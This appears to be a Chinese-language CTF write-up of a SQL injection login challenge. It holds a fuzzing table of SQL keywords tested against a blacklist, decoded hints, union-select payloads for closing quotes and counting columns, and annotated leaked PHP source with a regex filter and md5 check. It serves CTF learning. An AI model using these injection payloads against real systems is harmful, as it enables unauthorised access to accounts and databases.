@@ -1,0 +1,138 @@
+探测黑名单：
+	Request	Payload	Status code	Response received	Error	Timeout	Length	Comment
+0		200	81	false	false	423	
+3	!=	200	81	false	false	423	
+20	(	200	54	false	false	423	
+21	)	200	64	false	false	423	
+44	<=	200	69	false	false	423	
+45	<=>	200	58	false	false	423	
+47	=	200	92	false	false	423	
+49	>=	200	86	false	false	423	
+104	@@log_error	200	67	false	false	423	
+106	@@port	200	79	false	false	423	
+661	OPENROWSET(BULK)	200	77	false	false	423	
+1067	all_directories	200	73	false	false	423	
+1068	all_errors	200	73	false	false	423	
+1102	bit_or	200	58	false	false	423	
+1103	bit_xor	200	58	false	false	423	
+1132	date_format	200	66	false	false	423	
+1140	db_backupoperator	200	55	false	false	423	
+1149	dba_directories	200	61	false	false	423	
+1166	dbcreator	200	60	false	false	423	
+1175	dbms_network_acl_admin	200	70	false	false	423	
+1195	export_set	200	76	false	false	423	
+1204	format	200	73	false	false	423	
+1209	get_format	200	72	false	false	423	
+1226	information_schema	200	58	false	false	423	
+1227	information_schema.CHECK_CONSTRAINTS	200	73	false	false	423	
+1228	information_schema.COLUMNS	200	74	false	false	423	
+1229	information_schema.COLUMN_PRIVILEGES	200	68	false	false	423	
+1230	information_schema.ENGINES	200	68	false	false	423	
+1231	information_schema.EVENTS	200	68	false	false	423	
+1232	information_schema.FILES	200	66	false	false	423	
+1233	information_schema.GLOBAL_STATUS	200	65	false	false	423	
+1234	information_schema.GLOBAL_VARIABLES	200	65	false	false	423	
+1235	information_schema.INNODB_BUFFER_PAGE	200	64	false	false	423	
+1236	information_schema.INNODB_CMP	200	62	false	false	423	
+1237	information_schema.INNODB_CMPMEM	200	61	false	false	423	
+1238	information_schema.INNODB_CMPMEM_RESET	200	62	false	false	423	
+1239	information_schema.INNODB_CMP_PER_INDEX	200	60	false	false	423	
+1240	information_schema.INNODB_CMP_PER_INDEX_RESET	200	60	false	false	423	
+1241	information_schema.INNODB_CMP_RESET	200	78	false	false	423	
+1242	information_schema.INNODB_FT_BEING_DELETED	200	60	false	false	423	
+1243	information_schema.INNODB_FT_CONFIG	200	57	false	false	423	
+1244	information_schema.INNODB_FT_DEFAULT_STOPWORD	200	57	false	false	423	
+1245	information_schema.INNODB_FT_DELETED	200	59	false	false	423	
+1246	information_schema.INNODB_FT_INDEX_CACHE	200	59	false	false	423	
+1247	information_schema.INNODB_FT_INDEX_TABLE	200	58	false	false	423	
+1248	information_schema.INNODB_INDEX_STATS	200	60	false	false	423	
+1249	information_schema.INNODB_LOCKS	200	60	false	false	423	
+1250	information_schema.INNODB_LOCK_WAITS	200	72	false	false	423	
+1251	information_schema.INNODB_METRICS	200	71	false	false	423	
+1252	information_schema.INNODB_TABLESTATS	200	73	false	false	423	
+1253	information_schema.INNODB_TEMP_TABLE_INFO	200	69	false	false	423	
+1254	information_schema.INNODB_TRX	200	69	false	false	423	
+1255	information_schema.INNODB_VIRTUAL	200	67	false	false	423	
+1256	information_schema.KEY_COLUMN_USAGE	200	67	false	false	423	
+1257	information_schema.PARAMETERS	200	78	false	false	423	
+1258	information_schema.PARTITIONS	200	75	false	false	423	
+1259	information_schema.PLUGINS	200	78	false	false	423	
+1260	information_schema.PROCESSLIST	200	63	false	false	423	
+1261	information_schema.PROFILING	200	64	false	false	423	
+1262	information_schema.REFERENTIAL_CONSTRAINTS	200	51	false	false	423	
+1263	information_schema.ROUTINES	200	66	false	false	423	
+1264	information_schema.SCHEMATA	200	66	false	false	423	
+1265	information_schema.SCHEMA_PRIVILEGES	200	66	false	false	423	
+1266	information_schema.SESSION_STATUS	200	67	false	false	423	
+1267	information_schema.SESSION_VARIABLES	200	72	false	false	423	
+1268	information_schema.STATISTICS	200	73	false	false	423	
+1269	information_schema.TABLES	200	68	false	false	423	
+1270	information_schema.TABLE_CONSTRAINTS	200	67	false	false	423	
+1271	information_schema.TABLE_PRIVILEGES	200	67	false	false	423	
+1272	information_schema.TRIGGERS	200	73	false	false	423	
+1273	information_schema.USER_PRIVILEGES	200	87	false	false	423	
+1274	information_schema.VIEWS	200	87	false	false	423	
+1275	information_schema.columns	200	86	false	false	423	
+1276	information_schema.key_column_usage	200	86	false	false	423	
+1277	information_schema.routines	200	56	false	false	423	
+1278	information_schema.schemata	200	57	false	false	423	
+1279	information_schema.table_constraints	200	56	false	false	423	
+1280	information_schema.tables	200	59	false	false	423	
+1281	information_schema.views	200	56	false	false	423	
+1370	ord	200	63	false	false	423	
+1374	performance_schema	200	71	false	false	423	
+1449	sp_oageterrorinfo	200	74	false	false	423	
+1454	sp_password	200	74	false	false	423	
+1507	sys.statements_with_errors_or_warnings	200	63	false	false	423	
+1510	sys.statements_with_sorting	200	73	false	false	423	
+1545	time_format	200	71	false	false	423	
+1564	user_errors	200	79	false	false	423	
+
+提示
+	MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
+	进行base32解码：
+	c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==  
+	进行base64解码：
+	select * from user where username = '$name'我觉得这里就以及在按时我单引号闭合了
+闭合方式探测：
+	123' return：报错
+	123'# return：wrong user
+探测列数：
+	name=123' union select 1,2,3#
+基本判断sql语句：SELECT * FROM user WHERE username = 'admin' AND password = '123456';
+探测数据库名：
+	这里不行因为()被禁用了
+探测是否存在admin账户：
+	直接输入admin，显示wrong pass说明有admin账户
+	看一下admin在第几个字段：
+	name=123' union select 1,'admin',3#
+		returns：wrong pass说明第二个字段为username
+源码泄露：
+	$result = mysql_query($con, $sql);	//执行一次查询
+
+	if(preg_match("/\/(\|\)\|\=|or/", $name)){	//正则过滤(,),|,=,or,/
+		die("do not hack me!");	//如果POST表单中name参数有黑名单中的字符则输出do not hack me！
+	}
+	else{
+		if (!$result) {	//查询的结果的句柄/指针指向查询返回的结果
+			printf("Error: %s\n", mysql_error($con));	//如果没有返回则输出报错，也就是如果出现语法错误则不会返回信息
+			exit();	//然后退出
+		}
+		else{
+			// echo '<pre>';
+			$arr = mysql_fetch_row($result); //抓取返回结果的第一行，然后赋予变量arr，是个数组
+			// print_r($arr);
+			if($arr[1] == "admin") {	//如果arr[1]也就是数组的第二个位置是admin则进入if
+				if(md5($password) == $arr[2]){	//$password是POST表单上传的第二个参数，也就是密码，如果对密码进行MD5加密然后结果与arr[3]相等则输出flag，但由于之前我已经测出来了有三个字段通过(name=123' union select 1,2,3#)说明mysql_fetch_row抓取到了三个参数分别在数组的0，1，2位置，1上填写admin，2则填写password的MD5
+				
+					echo $flag;
+				}
+			} else{
+				die("wrong pass!");
+			}
+		}
+		else{
+			die("wrong user!");
+		}
+	}
+	?>
